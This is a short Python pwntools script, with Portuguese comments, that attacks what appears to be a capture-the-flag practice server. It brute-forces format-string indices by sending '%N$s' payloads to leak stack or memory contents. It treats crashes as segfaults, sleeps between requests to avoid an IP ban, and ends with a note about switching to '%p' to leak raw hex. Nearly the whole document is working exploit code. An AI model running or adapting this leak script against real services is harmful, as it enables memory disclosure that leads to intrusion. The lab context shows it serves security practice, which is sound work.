import time
from pwn import *

# Configura o nível de logs do pwntools para mostrar apenas o essencial
context.log_level = 'error'

for i in range(1, 80):
    p = None
    try:
        # Abre a conexão
        p = remote('chatelaine.cylabacademy.net', 22397, timeout=3)
        
        # Cria o payload de formato
        payload = f"%{i}$s".encode()
        
        # Envia após o prompt
        p.sendlineafter(b"Give me your order and I'll read it back to you:\n", payload)
        
        # Tenta ler a resposta
        response = p.recvline(timeout=2)
        print(f"[Index {i}] -> {response}")
        
    except Exception as e:
        # Se o servidor derrubou a conexão (crash por endereço inválido), cai aqui
        print(f"[Index {i}] -> Conexão fechada ou erro (provável segfault no índice).")
        
    finally:
        # Garante o encerramento absoluto da socket connection nesta iteração
        if p:
            try:
                p.close()
            except:
                pass
        
    # Pequena pausa para não floodar o servidor e tomar ban de IP
    time.sleep(0.2)


###########  Modificando a variavel do payload de %s para %p para procurar hexadecimal bruto e depois surgiu a ideia de converter o hexadecimal